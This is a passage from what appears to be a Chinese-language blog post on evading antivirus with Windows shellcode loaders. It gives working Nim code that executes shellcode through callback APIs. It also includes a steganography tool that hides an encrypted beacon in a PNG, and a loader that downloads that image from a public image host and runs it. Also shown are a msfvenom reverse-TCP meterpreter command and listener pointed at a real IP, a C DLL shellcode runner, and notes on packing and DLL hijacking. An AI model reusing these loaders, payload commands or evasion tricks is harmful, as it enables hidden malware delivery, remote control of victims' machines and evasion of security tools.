    <span class="hljs-keyword">when</span> isMainModule:
        injectCreateRemoteThread(shellcode)
</code></pre>
<p><a href="https://imgse.com/i/ppon1Rf" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppon1Rf.png" alt="ppon1Rf.png"></a></p>
<h5 id="&#x914D;&#x5408;&#x52A0;&#x8F7D;&#x5206;&#x79BB;">&#x914D;&#x5408;&#x52A0;&#x8F7D;&#x5206;&#x79BB;</h5>
<pre><code>&#x4ECE;&#x5176;&#x4ED6;&#x6587;&#x4EF6;&#x52A0;&#x8F7D;shellcode
</code></pre><pre><code class="lang-nim"><span class="hljs-keyword">import</span> winim/lean
<span class="hljs-keyword">import</span> osproc
<span class="hljs-keyword">import</span> stew/byteutils
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> strutils

<span class="hljs-keyword">proc</span> shellcodeCallback(shellcode: <span class="hljs-built_in">openarray</span>[byte]): <span class="hljs-built_in">void</span> =
    <span class="hljs-keyword">let</span> tProcess = <span class="hljs-type">GetCurrentProcessId</span>()
    echo <span class="hljs-string">&quot;Powered by StudyCat&quot;</span>
    echo <span class="hljs-string">&quot;[*] Target Process: &quot;</span>, tProcess
    echo <span class="hljs-string">&quot;    \\-- bytes written: &quot;</span>, shellcode.len
    echo <span class="hljs-string">&quot;[+] Injected&quot;</span>

    <span class="hljs-comment"># Allocate memory</span>
    <span class="hljs-keyword">let</span> rPtr = <span class="hljs-type">VirtualAlloc</span>(
        <span class="hljs-keyword">nil</span>,
        <span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len),
        <span class="hljs-type">MEM_COMMIT</span>,
        <span class="hljs-type">PAGE_EXECUTE_READ_WRITE</span>
    )    

    <span class="hljs-comment"># Copy Shellcode to the allocated memory section</span>
    copyMem(rPtr,unsafeAddr shellcode,<span class="hljs-keyword">cast</span>[<span class="hljs-type">SIZE_T</span>](shellcode.len))    

    <span class="hljs-comment"># Callback execution</span>
    <span class="hljs-type">EnumSystemGeoID</span>(
        <span class="hljs-number">16</span>,
        <span class="hljs-number">0</span>,
        <span class="hljs-keyword">cast</span>[<span class="hljs-type">GEO_ENUMPROC</span>](rPtr)
    ) 


<span class="hljs-keyword">proc</span> main() =    
    <span class="hljs-keyword">if</span> fileExists(paramStr(<span class="hljs-number">1</span>)):
        <span class="hljs-keyword">var</span> 
            filename = paramStr(<span class="hljs-number">1</span>)
            file: <span class="hljs-type">File</span>

        file = open(filename, fmRead)
        <span class="hljs-keyword">var</span> fileSize = file.getFileSize() 
        <span class="hljs-keyword">var</span> shellcode = newSeq[byte](fileSize)
        <span class="hljs-keyword">discard</span> file.readBytes(shellcode, <span class="hljs-number">0</span>, fileSize)
        shellcodeCallback(shellcode)
        file.close()
    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">var</span> hexstr: <span class="hljs-built_in">string</span> = paramStr(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">var</span> shellcode = newSeq[byte](len(hexstr) <span class="hljs-keyword">div</span> <span class="hljs-number">2</span>)
        hexToByteArray(hexstr, shellcode)
        shellcodeCallback(shellcode)    

<span class="hljs-keyword">when</span> defined(windows):
    <span class="hljs-keyword">if</span> <span class="hljs-number">2</span> &gt; <span class="hljs-number">1</span>:
        <span class="hljs-keyword">if</span> paramCount() &gt; <span class="hljs-number">0</span> :           
            main()
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">let</span> pathSplit = splitPath(paramStr(<span class="hljs-number">0</span>))
            echo <span class="hljs-string">&quot;Usage: &quot;</span>, pathSplit.tail, <span class="hljs-string">&quot; fce88900000...648b52308b&quot;</span>
            echo <span class="hljs-string">&quot;Usage: &quot;</span>, pathSplit.tail, <span class="hljs-string">&quot; beacon.bin&quot;</span>
</code></pre>
<p>&#x8BB0;&#x5F97;nim-stew-master&#x89E3;&#x538B;&#x540E;&#x590D;&#x5236;stew&#x5230;&#x8FD0;&#x884C;&#x76EE;&#x5F55;&#x4E0B;&#x5373;&#x53EF;</p>
<h6 id="1-&#x91C7;&#x7528;batmanfutureexe-xxxbin">1-&#x91C7;&#x7528;batmanfuture.exe xxx.bin</h6>
<p>&#x52A0;&#x8F7D;&#x6587;&#x4EF6;&#x4E0A;&#x7EBF;</p>
<p><a href="https://imgse.com/i/ppoM4Wq" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppoM4Wq.png" alt="ppoM4Wq.png"></a></p>
<p>&#x4F46;&#x662F;&#x8FD9;&#x79CD;&#x5BF9;xxx.bin&#x4E5F;&#x8981;&#x514D;&#x6740;&#xFF0C;&#x53EF;&#x4EE5;&#x8BD5;&#x7B2C;&#x4E8C;&#x79CD;&#x547D;&#x4EE4;&#x884C;</p>
<h6 id="2-&#x547D;&#x4EE4;&#x884C;">2-&#x547D;&#x4EE4;&#x884C;</h6>
<p>&#x7528;msf&#x751F;&#x6210;payload</p>
<pre><code>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=129.226.92.29 lport=10010 -f hex
</code></pre><p><a href="https://imgse.com/i/ppoQWnO" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppoQWnO.png" alt="ppoQWnO.png"></a></p>
<p>&#x76F4;&#x63A5;&#x5F00;&#x542F;&#x76D1;&#x542C;&#x4F20;&#x9012;&#x53C2;&#x6570;&#x6267;&#x884C;&#x4E0A;&#x7EBF;</p>
<pre><code>use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 129.226.92.29
set lport 10010
exploit
</code></pre><p><a href="https://imgse.com/i/ppoQxEQ" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppoQxEQ.png" alt="ppoQxEQ.png"></a></p>
<p><a href="https://imgse.com/i/ppol9Cn" target="_blank"><img src="https://s1.ax1x.com/2023/04/06/ppol9Cn.png" alt="ppol9Cn.png"></a></p>
<h6 id="3-&#x56FE;&#x7247;&#x9690;&#x5199;">3-&#x56FE;&#x7247;&#x9690;&#x5199;</h6>
<pre><code class="lang-nim"><span class="hljs-keyword">import</span> nimPNG
<span class="hljs-keyword">import</span> nimcrypto
<span class="hljs-keyword">import</span> nimcrypto/sysrand
<span class="hljs-keyword">import</span> strutils
<span class="hljs-keyword">import</span> stew/byteutils <span class="hljs-keyword">except</span> toHex
<span class="hljs-keyword">import</span> os

<span class="hljs-keyword">type</span>
  <span class="hljs-type">Image</span>* = <span class="hljs-keyword">ref</span> <span class="hljs-keyword">object</span>
    <span class="hljs-comment">## Main image object that holds the bitmap data.</span>
    filePath*: <span class="hljs-built_in">string</span>
    width*, height*: <span class="hljs-built_in">int</span>
    data*: <span class="hljs-built_in">seq</span>[<span class="hljs-built_in">uint8</span>]

<span class="hljs-keyword">proc</span> loadImageB*(imgFile: <span class="hljs-built_in">string</span>): <span class="hljs-type">Image</span> =
    <span class="hljs-keyword">var</span> mypng = <span class="hljs-type">Image</span>()
    <span class="hljs-keyword">let</span> png = loadPNG32(imgFile)
    mypng.width = png.width
    mypng.height = png.height
    mypng.data = <span class="hljs-keyword">cast</span>[<span class="hljs-built_in">seq</span>[<span class="hljs-built_in">uint8</span>]](png.data)  
    <span class="hljs-keyword">return</span> mypng

<span class="hljs-keyword">proc</span> loadImage*(rawData: <span class="hljs-built_in">string</span>): <span class="hljs-type">Image</span> =
    <span class="hljs-keyword">var</span> mypng = <span class="hljs-type">Image</span>()
    <span class="hljs-comment">#let png = loadPNG32(imgFile)</span>
    <span class="hljs-keyword">let</span> png = decodePNG32(rawData)
    mypng.width = png.width
    mypng.height = png.height
    mypng.data = <span class="hljs-keyword">cast</span>[<span class="hljs-built_in">seq</span>[<span class="hljs-built_in">uint8</span>]](png.data)  
    <span class="hljs-keyword">return</span> mypng    

<span class="hljs-keyword">proc</span> saveFile*(image: <span class="hljs-type">Image</span>, fileName: <span class="hljs-built_in">string</span>) =
    <span class="hljs-keyword">discard</span> savePNG32(fileName, image.data, image.width, image.height)

<span class="hljs-keyword">proc</span> encodeMessage*(image: <span class="hljs-type">Image</span>, rawdata: <span class="hljs-built_in">string</span>) =
  <span class="hljs-keyword">let</span> filesize = <span class="hljs-keyword">cast</span>[<span class="hljs-built_in">uint64</span>](len(rawdata))
  <span class="hljs-keyword">let</span> header = filesize.toHex(<span class="hljs-number">8</span>)
  <span class="hljs-keyword">var</span> data = header &amp; rawdata 

  <span class="hljs-comment">## Hide data inside an image</span>
  echo <span class="hljs-string">&quot;[*] Input image size: &quot;</span>, image.width, <span class="hljs-string">&quot;x&quot;</span>, image.height, <span class="hljs-string">&quot; pixels.&quot;</span>
  echo <span class="hljs-string">&quot;[*] Usable payload size: &quot;</span>, image.width * image.height, <span class="hljs-string">&quot;B.&quot;</span>
  echo <span class="hljs-string">&quot;[+] Encrypted payload size: &quot;</span>, len(data), <span class="hljs-string">&quot;B.&quot;</span>

  <span class="hljs-keyword">if</span> len(data) &gt; image.width * image.height :
    echo <span class="hljs-string">&quot;[-] Cannot embed. File too large&quot;</span>
    quit(-<span class="hljs-number">1</span>)

  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..data.len:
    <span class="hljs-keyword">var</span> dataByte: <span class="hljs-built_in">uint8</span>
    <span class="hljs-keyword">if</span> i &lt; data.len:
      dataByte = <span class="hljs-built_in">uint8</span>(data[i])
    image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">0</span>] = (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11111100</span>) + (dataByte <span class="hljs-keyword">and</span> <span class="hljs-number">0b00000011</span>) <span class="hljs-keyword">shr</span> <span class="hljs-number">0</span>
    image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>] = (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11111100</span>) + (dataByte <span class="hljs-keyword">and</span> <span class="hljs-number">0b00001100</span>) <span class="hljs-keyword">shr</span> <span class="hljs-number">2</span>
    image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>] = (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11111100</span>) + (dataByte <span class="hljs-keyword">and</span> <span class="hljs-number">0b00110000</span>) <span class="hljs-keyword">shr</span> <span class="hljs-number">4</span>
    image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>] = (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11111100</span>) + (dataByte <span class="hljs-keyword">and</span> <span class="hljs-number">0b11000000</span>) <span class="hljs-keyword">shr</span> <span class="hljs-number">6</span>
  echo <span class="hljs-string">&quot;[+] Embedded successfully!&quot;</span>

<span class="hljs-keyword">proc</span> decodeMessage*(image: <span class="hljs-type">Image</span>): <span class="hljs-built_in">string</span> =
  <span class="hljs-comment">## Extract hidden data in the image</span>
  echo <span class="hljs-string">&quot;[*] Input image size: &quot;</span>, image.width, <span class="hljs-string">&quot;x&quot;</span>, image.height, <span class="hljs-string">&quot; pixels.&quot;</span>

  <span class="hljs-literal">result</span> = <span class="hljs-string">&quot;&quot;</span>

  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span>..&lt;(image.data.len <span class="hljs-keyword">div</span> <span class="hljs-number">4</span>):
    <span class="hljs-keyword">var</span> dataByte: <span class="hljs-built_in">uint8</span>
    dataByte += (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">0</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11</span>) <span class="hljs-keyword">shl</span> <span class="hljs-number">0</span>
    dataByte += (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">1</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11</span>) <span class="hljs-keyword">shl</span> <span class="hljs-number">2</span>
    dataByte += (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">2</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11</span>) <span class="hljs-keyword">shl</span> <span class="hljs-number">4</span>
    dataByte += (image.data[i*<span class="hljs-number">4</span>+<span class="hljs-number">3</span>] <span class="hljs-keyword">and</span> <span class="hljs-number">0b11</span>) <span class="hljs-keyword">shl</span> <span class="hljs-number">6</span>
    <span class="hljs-literal">result</span>.add <span class="hljs-built_in">char</span>(dataByte)

  <span class="hljs-keyword">var</span> header = <span class="hljs-literal">result</span>[<span class="hljs-number">0</span>..<span class="hljs-number">7</span>]
  <span class="hljs-keyword">var</span> filesize = fromHex[<span class="hljs-built_in">uint64</span>](header) + <span class="hljs-number">7</span>
  <span class="hljs-keyword">return</span> <span class="hljs-literal">result</span>[<span class="hljs-number">8</span>..filesize]



func toByteSeq*(str: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">seq</span>[byte] <span class="hljs-meta">{.inline.}</span> =
  <span class="hljs-comment">## Converts a string to the corresponding byte sequence.</span>
  @(str.toOpenArrayByte(<span class="hljs-number">0</span>, str.high))

<span class="hljs-keyword">proc</span> encryptFile*(fileName: <span class="hljs-built_in">string</span>, envkey: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">string</span> =
    <span class="hljs-keyword">var</span>
        data: <span class="hljs-built_in">seq</span>[byte] = toByteSeq(readFile(fileName))
        ectx: <span class="hljs-type">CTR</span>[aes256]
        key: <span class="hljs-built_in">array</span>[aes256.sizeKey, byte]
        iv: <span class="hljs-built_in">array</span>[aes256.sizeBlock, byte]
        plaintext = newSeq[byte](len(data))
        enctext = newSeq[byte](len(data))

    <span class="hljs-comment">#discard randomBytes(addr iv[0], 16)</span>
    iv = [byte <span class="hljs-number">39</span>, <span class="hljs-number">215</span>, <span class="hljs-number">183</span>, <span class="hljs-number">62</span>, <span class="hljs-number">212</span>, <span class="hljs-number">75</span>, <span class="hljs-number">101</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">66</span>, <span class="hljs-number">92</span>, <span class="hljs-number">49</span>, <span class="hljs-number">164</span>, <span class="hljs-number">183</span>, <span class="hljs-number">14</span>, <span class="hljs-number">146</span>]
    copyMem(<span class="hljs-keyword">addr</span> plaintext[<span class="hljs-number">0</span>], <span class="hljs-keyword">addr</span> data[<span class="hljs-number">0</span>], len(data))
    <span class="hljs-keyword">var</span> expandedkey = sha256.digest(envkey)
    copyMem(<span class="hljs-keyword">addr</span> key[<span class="hljs-number">0</span>], <span class="hljs-keyword">addr</span> expandedkey.data[<span class="hljs-number">0</span>], len(expandedkey.data))

    ectx.init(key, iv)
    ectx.encrypt(plaintext, enctext)
    ectx.clear()    

    <span class="hljs-keyword">var</span> res = newString(len(enctext))
    copyMem(<span class="hljs-keyword">addr</span> res[<span class="hljs-number">0</span>], <span class="hljs-keyword">addr</span> enctext[<span class="hljs-number">0</span>], len(enctext))
    <span class="hljs-literal">result</span> = res

<span class="hljs-keyword">proc</span> decrypt*(data: <span class="hljs-built_in">string</span>, envkey: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">seq</span>[byte] =
    <span class="hljs-keyword">var</span> 
        dctx: <span class="hljs-type">CTR</span>[aes256]
        key: <span class="hljs-built_in">array</span>[aes256.sizeKey, byte]
        iv: <span class="hljs-built_in">array</span>[aes256.sizeBlock, byte]
        enctext = newSeq[byte](len(data))
        dectext = newSeq[byte](len(data))

    iv = [byte <span class="hljs-number">39</span>, <span class="hljs-number">215</span>, <span class="hljs-number">183</span>, <span class="hljs-number">62</span>, <span class="hljs-number">212</span>, <span class="hljs-number">75</span>, <span class="hljs-number">101</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">66</span>, <span class="hljs-number">92</span>, <span class="hljs-number">49</span>, <span class="hljs-number">164</span>, <span class="hljs-number">183</span>, <span class="hljs-number">14</span>, <span class="hljs-number">146</span>]
    enctext = toByteSeq(data)

    <span class="hljs-keyword">var</span> expandedkey = sha256.digest(envkey)
    copyMem(<span class="hljs-keyword">addr</span> key[<span class="hljs-number">0</span>], <span class="hljs-keyword">addr</span> expandedkey.data[<span class="hljs-number">0</span>], len(expandedkey.data))

    dctx.init(key, iv)
    dctx.decrypt(enctext, dectext)
    dctx.clear()
    <span class="hljs-comment">#writeFile(fileName, dectext)</span>
    <span class="hljs-keyword">return</span> dectext

<span class="hljs-keyword">proc</span> help() =
    <span class="hljs-keyword">let</span> pathSplit = splitPath(paramStr(<span class="hljs-number">0</span>))
    echo <span class="hljs-string">&quot;Usage:&quot;</span>
    echo <span class="hljs-string">&quot;  &quot;</span>, pathSplit.tail, <span class="hljs-string">&quot; en pngFile embedFile password&quot;</span>
    echo <span class="hljs-string">&quot;  &quot;</span>, pathSplit.tail, <span class="hljs-string">&quot;de pngFile outFile password&quot;</span>
    echo <span class="hljs-string">&quot;&quot;</span>
    echo <span class="hljs-string">&quot;Example:&quot;</span>
    echo <span class="hljs-string">&quot;  Embed a file into an image.&quot;</span>
    echo <span class="hljs-string">&quot;  &quot;</span>, pathSplit.tail, <span class="hljs-string">&quot; en logo.png beacon.bin 12345678&quot;</span>
    echo <span class="hljs-string">&quot;  Extract hidden data in the image.&quot;</span>
    echo <span class="hljs-string">&quot;  &quot;</span>, pathSplit.tail, <span class="hljs-string">&quot; de logo_out.png beacon.bin 12345678&quot;</span>

<span class="hljs-keyword">proc</span> main() =
    <span class="hljs-keyword">if</span> paramCount() &gt; <span class="hljs-number">0</span>:
        <span class="hljs-keyword">var</span> p1 = paramStr(<span class="hljs-number">1</span>)
        <span class="hljs-keyword">if</span> paramCount() &lt; <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> p1 <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;/?&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>,<span class="hljs-string">&quot;--help&quot;</span>]:
            help()
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">var</span> 
                mode = paramStr(<span class="hljs-number">1</span>)
                imgFile = paramStr(<span class="hljs-number">2</span>)
                userFile = paramStr(<span class="hljs-number">3</span>)
                password = paramStr(<span class="hljs-number">4</span>)
            <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&quot;en&quot;</span>:
                <span class="hljs-keyword">var</span> enctext = encryptFile(userFile, password)
                <span class="hljs-keyword">var</span> mypng = loadImage(readFile(imgFile))
                <span class="hljs-keyword">var</span> fileName = <span class="hljs-string">&quot;&quot;</span>

                <span class="hljs-keyword">let</span> fileSplit = splitFile(imgFile)
                fileName = joinPath(fileSplit.dir, fileSplit.name &amp; <span class="hljs-string">&quot;_out&quot;</span> &amp; fileSplit.ext)
                encodeMessage(mypng, enctext)
                mypng.saveFile(fileName)
                echo <span class="hljs-string">&quot;[+] fileName: &quot;</span>, fileName
            <span class="hljs-keyword">if</span> mode == <span class="hljs-string">&quot;de&quot;</span>:
                <span class="hljs-keyword">var</span> mypng = loadImage(readFile(imgFile))
                <span class="hljs-keyword">var</span> enctext = decodeMessage(mypng)
                <span class="hljs-keyword">var</span> dectext = decrypt(enctext, password)
                writeFile(userFile, dectext)
                echo <span class="hljs-string">&quot;[+] Written extracted data to &quot;</span>, userFile
    <span class="hljs-keyword">else</span>:
        help()

<span class="hljs-keyword">when</span> isMainModule:
    main()
</code></pre>
<pre><code>.\batmanfuture.exe en 123.png payload.bin batmanfuture
</code></pre><p>&#x5C06;shellcode&#x52A0;&#x8F7D;</p>
<pre><code class="lang-nim"><span class="hljs-keyword">import</span> shellcodeCallback
<span class="hljs-keyword">import</span> lsb
<span class="hljs-keyword">import</span> random
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> httpclient
<span class="hljs-keyword">import</span> strutils

<span class="hljs-keyword">proc</span> help() =
    <span class="hljs-keyword">let</span> pathSplit = splitPath(paramStr(<span class="hljs-number">0</span>))
    echo <span class="hljs-string">&quot;Usage:&quot;</span>
    echo pathSplit.tail, <span class="hljs-string">&quot; filename/url password&quot;</span>
    echo pathSplit.tail, <span class="hljs-string">&quot; https://www.test.com/logo.png 12345678&quot;</span>
    echo pathSplit.tail, <span class="hljs-string">&quot; logo.png 12345678&quot;</span>    

<span class="hljs-keyword">proc</span> main(imgFile,password: <span class="hljs-built_in">string</span>) =
    randomize()
    <span class="hljs-keyword">var</span> 
        shellcode: <span class="hljs-built_in">seq</span>[byte]
        mypng: <span class="hljs-type">Image</span>
        enctext: <span class="hljs-built_in">string</span>
        content: <span class="hljs-built_in">string</span>

    <span class="hljs-keyword">try</span>:        
        <span class="hljs-keyword">if</span> fileExists(imgFile):
            mypng = loadImage(readFile(imgFile))
            enctext = decodeMessage(mypng)
            shellcode = decrypt(enctext, password)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">var</span> client = newHttpClient()
            content = getContent(client, imgFile)
            mypng = loadImage(content)
            enctext = decodeMessage(mypng)
            shellcode = decrypt(enctext, password)    
    <span class="hljs-keyword">except</span>:
        echo getCurrentException().msg
        quit()


    <span class="hljs-keyword">case</span> rand(<span class="hljs-number">1</span>..<span class="hljs-number">17</span>)
    <span class="hljs-keyword">of</span> <span class="hljs-number">1</span>:
        doEnumSystemGeoID(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">2</span>:
        doCertEnumSystemStore(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">3</span>:
        doCertEnumSystemStoreLocation(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">4</span>:
        doCopy2(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">5</span>:
        doCopyFileExW(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">6</span>:
        doEnumChildWindows(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">7</span>:
        doEnumDesktopWindows(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">8</span>:
        doEnumPageFilesW(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">9</span>:
        doImageGetDigestStream(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">10</span>:
        doEnumDateFormatsA(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">11</span>:
        doEnumSystemCodePagesA(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">12</span>:
        doEnumSystemLanguageGroupsA(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">13</span>:
        doEnumSystemLocalesA(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">14</span>:
        doEnumThreadWindows(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">15</span>:
        doEnumWindows(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">16</span>:
        doEnumUILanguagesA(shellcode)
    <span class="hljs-keyword">of</span> <span class="hljs-number">17</span>:
        doSymEnumProcesses(shellcode)
    <span class="hljs-keyword">else</span>:
        echo <span class="hljs-string">&quot;unknown command&quot;</span>

<span class="hljs-keyword">when</span> isMainModule:
    <span class="hljs-keyword">when</span> defined(windows):
        <span class="hljs-keyword">if</span> paramCount() &gt; <span class="hljs-number">0</span>:
            <span class="hljs-keyword">var</span> p1 = paramStr(<span class="hljs-number">1</span>)
            <span class="hljs-keyword">if</span> paramCount() &lt; <span class="hljs-number">2</span> <span class="hljs-keyword">or</span> p1 <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;/?&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>,<span class="hljs-string">&quot;--help&quot;</span>]:
                help()
            <span class="hljs-keyword">else</span>:
                <span class="hljs-keyword">if</span> fileExists(p1.toLowerAscii()) <span class="hljs-keyword">or</span> p1.toLowerAscii().startsWith(<span class="hljs-string">&quot;http://&quot;</span>) <span class="hljs-keyword">or</span> p1.toLowerAscii().startsWith(<span class="hljs-string">&quot;https://&quot;</span>):
                    main(paramStr(<span class="hljs-number">1</span>), paramStr(<span class="hljs-number">2</span>))
                <span class="hljs-keyword">else</span>:
                    help()
        <span class="hljs-keyword">else</span>:
            help()
</code></pre>
<p>&#x628A;&#x9690;&#x5199;&#x56FE;&#x7247;&#x653E;&#x5728;&#x56FE;&#x5E8A;&#x4E0A;</p>
<p><a href="https://s1.ax1x.com/2023/04/06/ppo6nmD.png" target="_blank">https://s1.ax1x.com/2023/04/06/ppo6nmD.png</a></p>
<pre><code>shellcodein.exe https://s1.ax1x.com/2023/04/06/ppo6nmD.png batmanfuture
</code></pre><p>&#x8C03;&#x7528;uuid&#xFF0C;mac&#xFF0C;ipv4&#x6267;&#x884C;shellcode</p>
<h3 id="&#x6E90;&#x7801;&#x514D;&#x6740;&#x540E;&#x514D;&#x6740;">&#x6E90;&#x7801;&#x514D;&#x6740;&#x540E;&#x514D;&#x6740;</h3>
<pre><code>&#x7279;&#x5F81;&#x7801;&#x67E5;&#x6740;
&#x6587;&#x4EF6;&#x548C;&#x6821;&#x9A8C;&#x6CD5;
&#x6C99;&#x76D2;&#x6821;&#x9A8C;&#x6CD5;
&#x4E91;&#x67E5;&#x6740;
</code></pre><pre><code>&#x52A0;&#x58F3;
&#x82B1;&#x6307;&#x4EE4;
&#x7279;&#x5F81;&#x7801;&#x4FEE;&#x6539;
</code></pre><h3 id="dll&#x6CE8;&#x5165;-&#x52A0;&#x8F7D;&#x5668;">DLL&#x6CE8;&#x5165;-&#x52A0;&#x8F7D;&#x5668;</h3>
<h5 id="dll&#x52AB;&#x6301;">DLL&#x52AB;&#x6301;</h5>
<pre><code>&#x5C06;shellcode&#x653E;&#x5728;&#x7531;c&#x7F16;&#x5199;&#x7684;dll&#x91CC;&#xFF0C;&#x901A;&#x8FC7;python&#x53BB;&#x8C03;&#x7528;dll&#x4E0A;&#x7EBF;
</code></pre><p><a href="https://imgse.com/i/ppTsaOU" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTsaOU.png" alt="ppTsaOU.png"></a></p>
<p>c&#x8BED;&#x8A00;</p>
<pre><code class="lang-c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;wtypes.h&gt;</span></span>

<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN32</span>
<span class="hljs-meta">#   <span class="hljs-meta-keyword">define</span> EXPORT __declspec(dllexport)</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>
<span class="hljs-meta">#   <span class="hljs-meta-keyword">define</span> EXPORT</span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>

<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] =
<span class="hljs-string">&quot;\xfc\x48&quot;</span>;

<span class="hljs-comment">// &#x5B9A;&#x4E49; test &#x51FD;&#x6570;</span>
<span class="hljs-function">EXPORT <span class="hljs-keyword">int</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>{
    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from test function!\n&quot;</span>);

    <span class="hljs-keyword">char</span>* Memory;
    Memory = VirtualAlloc(<span class="hljs-literal">NULL</span>, <span class="hljs-keyword">sizeof</span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-keyword">sizeof</span>(buf));
    ((<span class="hljs-keyword">void</span>(*)())Memory)();


    <span class="hljs-keyword">return</span> <span class="hljs-number">42</span>;
}

<span class="hljs-comment">// &#x5B9A;&#x4E49; DLL &#x5165;&#x53E3;&#x51FD;&#x6570;</span>
<span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)</span> </span>{
    <span class="hljs-keyword">switch</span> (ul_reason_for_call) {
    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:
    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:
    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:
    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:
        <span class="hljs-keyword">break</span>;
    }
    <span class="hljs-keyword">return</span> TRUE;
}
</code></pre>
<p>python</p>
<pre><code class="lang-python"><span class="hljs-keyword">from</span> ctypes <span class="hljs-keyword">import</span> *

<span class="hljs-comment">#&#x5229;&#x7528;python&#x8F7D;&#x5165;dll&#x6587;&#x4EF6;</span>
lib=CDLL(<span class="hljs-string">&apos;./batmanfuture.dll&apos;</span>)
<span class="hljs-comment">#&#x8C03;&#x7528;dll&#x6587;&#x4EF6;&#x5185;&#x7F6E;&#x65B9;&#x6CD5;&#x51FD;&#x6570;</span>

result = lib.test()
print(result)
</code></pre>
<p><a href="https://imgse.com/i/ppTclwD" target="_blank"><img src="https://s1.ax1x.com/2023/04/07/ppTclwD.png" alt="ppTclwD.png"></a></p>
<h3 id="&#x767D;&#x52A0;&#x9ED1;">&#x767D;&#x52A0;&#x9ED1;</h3>
<h5 id="&#x5BFC;&#x5165;&#x52A0;&#x8F7D;">&#x5BFC;&#x5165;&#x52A0;&#x8F7D;</h5>
<pre><code>&#x9996;&#x5148;&#x627E;&#x5230;&#x4E00;&#x4E2A;exe&#xFF0C;&#x5C06;&#x4ED6;&#x6240;&#x52A0;&#x8F7D;&#x7684;&#x4E00;&#x4E2A;dll&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x76EE;&#x5F55;&#x4E0B;
